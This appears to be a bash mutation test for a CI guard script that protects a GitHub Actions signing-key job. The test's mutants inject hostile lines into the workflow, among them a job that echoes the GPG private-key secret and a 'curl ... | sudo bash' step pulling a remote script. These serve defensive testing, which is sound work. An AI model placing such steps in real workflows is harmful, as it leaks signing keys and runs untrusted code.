#!/usr/bin/env bash
# Counter-test of check-key-jobs.sh: the real files pass; each mutant of publish.yml must turn the check red.
# shellcheck disable=SC2015,SC2016
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd); wf=$here/../.github/workflows; w=$(mktemp -d); trap 'rm -rf "$w"' EXIT; fail=0
ok() { echo "PASS: $1"; }; bad() { echo "FAIL: $1"; fail=1; }
c=$here/check-key-jobs.sh
"$c" "$wf/publish.yml" rpm-index-gate > /dev/null && ok "publish.yml passes" || bad "publish.yml refused"
"$c" "$wf/nightly.yml" > /dev/null && ok "nightly.yml passes" || bad "nightly.yml refused"
mutant() { # NAME  (the mutated file is $w/m.yml, made from stdin-filter in $2..)
  local name=$1; shift; "$@" < "$wf/publish.yml" > "$w/m.yml"; cmp -s "$w/m.yml" "$wf/publish.yml" && { bad "mutant $name changed nothing"; return; }
  "$c" "$w/m.yml" rpm-index-gate > /dev/null 2>&1 && bad "mutant accepted: $name" || ok "mutant refused: $name"
}
mutant "environment removed from the key job" sed '/^    environment: apt-signing$/d'
mutant "second job with a secret" sed '/^  rpm-index-gate:$/i\  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo "$K"\n        env:\n          K: ${{ secrets.GPG_PRIVATE_KEY }}'
mutant "createrepo_rs (cargo install) inside the key job" sed 's/rpm gnupg createrepo-c xz-utils$/rpm gnupg createrepo-c xz-utils \&\& cargo install createrepo_rs/'
mutant "gate missing in deploy.needs" sed 's/needs: \[sign, rpm-index-gate\]/needs: sign/'
mutant "foreign action inside the key job" sed '0,/^      - name: Tools from the Ubuntu archive$/s//      - uses: someone\/else@v1\n      - name: Tools from the Ubuntu archive/'
mutant "environment removed from a key job whose header has a comment (was: false green)" sed -e 's/^  sign:$/  sign: # the key job/' -e '/^    environment: apt-signing$/d'
mkdir "$w/c" && sed 's/^  sign:$/  sign: # the key job/' "$wf/publish.yml" > "$w/c/publish.yml" && "$c" "$w/c/publish.yml" rpm-index-gate 2>&1 | grep -q "one key job (sign)" && ok "comment after a job header: the key job is still found as sign" || bad "comment after a job header refused"
mutant "curl | sudo bash inside the key job" sed '/^      - name: Tools from the Ubuntu archive$/i\      - run: curl -fsSL https://x.example/i.sh | sudo bash'
# a third workflow with apt-signing (mistake) must be refused; check.yml itself must pass
mkdir "$w/wf" && cp "$wf"/*.yml "$w/wf/" && printf 'name: x\njobs:\n  j:\n    environment: apt-signing\n    runs-on: ubuntu-24.04\n' > "$w/wf/third.yml"
"$c" "$w/wf/publish.yml" rpm-index-gate > /dev/null 2>&1 && bad "mutant accepted: third workflow with apt-signing" || ok "mutant refused: third workflow with apt-signing"
exit "$fail"
